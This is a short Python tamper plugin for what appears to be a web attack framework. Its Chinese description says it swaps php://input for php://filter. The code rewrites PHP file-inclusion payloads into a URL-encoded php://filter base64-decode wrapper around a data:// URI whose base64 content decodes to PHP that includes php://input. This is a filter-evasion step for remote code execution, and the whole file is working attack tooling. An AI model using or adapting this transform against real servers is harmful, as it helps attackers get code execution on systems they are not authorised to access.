# tamper_phpfilter_warp.py

name = "tamper_phpfilter_warp"
description = "將 payload 中的 php://input 使用 php://filter 替換"

def tamper(data):
    payload = data.get("payload", "")
    if "php://input" in payload:
        payload = payload.replace("php://input", "%22php://filter/convert.base64-decode/resource%3Ddata://text/plain,PD9waHAgaW5jbHVkZSgncGhwOi8vaW5wdXQnKTsgPz4%3D%22")
        data["payload"] = payload
    return data
